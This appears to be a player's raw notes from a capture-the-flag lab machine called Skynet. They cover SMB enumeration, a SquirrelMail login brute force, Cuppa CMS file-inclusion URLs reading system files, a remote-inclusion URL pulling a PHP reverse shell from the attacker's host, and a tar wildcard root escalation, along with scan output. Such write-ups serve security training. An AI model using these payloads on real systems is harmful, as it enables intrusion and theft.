@@ -1,0 +1,189 @@
+80 http -->
+	found  /squirrelmail v 1.4.23
+	login page
+
+445 smb --> 
+	enum4linux
+	--> found shares anonymous and milesdyson
+	--> smbclient -L \\$IP
+	--> smblient \\\\$IP\\anonymous (no password)
+		--> attention.txt file
+		--> log1.txt file (contains a list of previously used passwords)
+	--> burpsuite to brute force the login with username milesdyson and password list
+	
+creds email
+milesdyson:cyborg007haloterminator
+
+
+mail in squirrel mail
+
+We have changed your smb password after system malfunction.
+Password: )s{A&2Z=F^n_E.B`
+
+
+creds smb
+milesdyson:)s{A&2Z=F^n_E.B`
+
+
+--> smbclient -U milesdyson \\\\$IP\\milesdyson
+	--> notes/important.txt
+
+root@kali:~/skynet# cat important.txt 
+
+1. Add features to beta CMS /45kra24zxs28v3yd
+2. Work on T-800 Model 101 blueprints
+3. Spend more time with my wife
+
+wfuzz $IP/45kra24zxs28v3yd
+--> /adminstrator
+**found Cuppa CMS
+
+Exploit Title                                                               |  Path
+----------------------------------------------------------------------------- ---------------------------------
+Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion              | php/webapps/25971.txt
+
+
+http://10.10.137.27/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
+
+http://10.10.137.27/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../home/milesdyson/user.txt
+
+7ce5c2109a40f958099283600a9ae807
+--------------------------------------------------------------------------------
+http://10.10.137.27/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.10.53.213:8080/php-reverse-shell.php
+
+**got php rev shell from /usr/share/laudnum/php/php-reverse.php
+
+>> shell as www-data
+
+under /home/milesdyson/backups
+backups.sh		https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/
+
+www-data@skynet:/home/milesdyson/backups$ cat backup.sh 
+#!/bin/bash
+cd /var/www/html
+tar cf /home/milesdyson/backups/backup.tgz *
+
+--> this means that anything from the /var/www/html folder will get compressed with tar running as root
+from GTFObins
+Sudo
+
+If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.
+sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+
+
+
+
+
+
+
+http://10.10.137.27/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php
+
+base64 output
+PD9waHAgCgljbGFzcyBDb25maWd1cmF0aW9uewoJCXB1YmxpYyAkaG9zdCA9ICJsb2NhbGhvc3QiOwoJCXB1YmxpYyAkZGIgPSAiY3VwcGEiOwoJCXB1YmxpYyAkdXNlciA9ICJyb290IjsKCQlwdWJsaWMgJHBhc3N3b3JkID0gInBhc3N3b3JkMTIzIjsKCQlwdWJsaWMgJHRhYmxlX3ByZWZpeCA9ICJjdV8iOwoJCXB1YmxpYyAkYWRtaW5pc3RyYXRvcl90ZW1wbGF0ZSA9ICJkZWZhdWx0IjsKCQlwdWJsaWMgJGxpc3RfbGltaXQgPSAyNTsKCQlwdWJsaWMgJHRva2VuID0gIk9CcUlQcWxGV2YzWCI7CgkJcHVibGljICRhbGxvd2VkX2V4dGVuc2lvbnMgPSAiKi5ibXA7ICouY3N2OyAqLmRvYzsgKi5naWY7ICouaWNvOyAqLmpwZzsgKi5qcGVnOyAqLm9kZzsgKi5vZHA7ICoub2RzOyAqLm9kdDsgKi5wZGY7ICoucG5nOyAqLnBwdDsgKi5zd2Y7ICoudHh0OyAqLnhjZjsgKi54bHM7ICouZG9jeDsgKi54bHN4IjsKCQlwdWJsaWMgJHVwbG9hZF9kZWZhdWx0X3BhdGggPSAibWVkaWEvdXBsb2Fkc0ZpbGVzIjsKCQlwdWJsaWMgJG1heGltdW1fZmlsZV9zaXplID0gIjUyNDI4ODAiOwoJCXB1YmxpYyAkc2VjdXJlX2xvZ2luID0gMDsKCQlwdWJsaWMgJHNlY3VyZV9sb2dpbl92YWx1ZSA9ICIiOwoJCXB1YmxpYyAkc2VjdXJlX2xvZ2luX3JlZGlyZWN0ID0gIiI7Cgl9IAo/Pg== 
+
+decode via cyberchef
+<?php 
+	class Configuration{
+		public $host = "localhost";
+		public $db = "cuppa";
+		public $user = "root";
+		public $password = "password123";
+		public $table_prefix = "cu_";
+		public $administrator_template = "default";
+		public $list_limit = 25;
+		public $token = "OBqIPqlFWf3X";
+		public $allowed_extensions = "*.bmp; *.csv; *.doc; *.gif; *.ico; *.jpg; *.jpeg; *.odg; *.odp; *.ods; *.odt; *.pdf; *.png; *.ppt; *.swf; *.txt; *.xcf; *.xls; *.docx; *.xlsx";
+		public $upload_default_path = "media/uploadsFiles";
+		public $maximum_file_size = "5242880";
+		public $secure_login = 0;
+		public $secure_login_value = "";
+		public $secure_login_redirect = "";
+	} 
+?>
+
+
+
+====================================
+
+22/tcp  open  ssh
+80/tcp  open  http
+110/tcp open  pop3
+139/tcp open  netbios-ssn
+143/tcp open  imap
+445/tcp open  microsoft-ds
+
+
+Nmap scan report for ip-10-10-137-27.eu-west-1.compute.internal (10.10.137.27)
+Host is up (0.00041s latency).
+
+PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (RSA)
+|   256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ECDSA)
+|_  256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (ED25519)
+80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: POST OPTIONS GET HEAD
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Skynet
+110/tcp open  pop3        Dovecot pop3d
+|_pop3-capabilities: AUTH-RESP-CODE PIPELINING TOP SASL RESP-CODES CAPA UIDL
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+143/tcp open  imap        Dovecot imapd
+|_imap-capabilities: IMAP4rev1 more have LOGINDISABLEDA0001 IDLE post-login LOGIN-REFERRALS Pre-login ID ENABLE SASL-IR capabilities LITERAL+ OK listed
+445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
+MAC Address: 02:6B:66:F5:0F:ED (Unknown)
+Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: mean: 1h39m59s, deviation: 2h53m12s, median: 0s
+| nbstat: NetBIOS name: SKYNET, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+| Names:
+|   SKYNET<00>           Flags: <unique><active>
+|   SKYNET<03>           Flags: <unique><active>
+|   SKYNET<20>           Flags: <unique><active>
+|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
+|   WORKGROUP<00>        Flags: <group><active>
+|   WORKGROUP<1d>        Flags: <unique><active>
+|_  WORKGROUP<1e>        Flags: <group><active>
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
+|   Computer name: skynet
+|   NetBIOS computer name: SKYNET\x00
+|   Domain name: \x00
+|   FQDN: skynet
+|_  System time: 2022-08-23T11:44:28-05:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2022-08-23T16:44:28
+|_  start_date: N/A
+
+
+
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          10.10.137.27
++ Target Hostname:    10.10.137.27
++ Target Port:        80
++ Start Time:         2022-08-23 16:46:43 (GMT0)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.18 (Ubuntu)
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Server may leak inodes via ETags, header found with file /, inode: 20b, size: 592bbec81c0b6, mtime: gzip
++ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
++ Allowed HTTP Methods: POST, OPTIONS, GET, HEAD 
++ Cookie SQMSESSID created without the httponly flag
++ OSVDB-3093: /squirrelmail/src/read_body.php: SquirrelMail found
++ OSVDB-3233: /icons/README: Apache default file found.
+
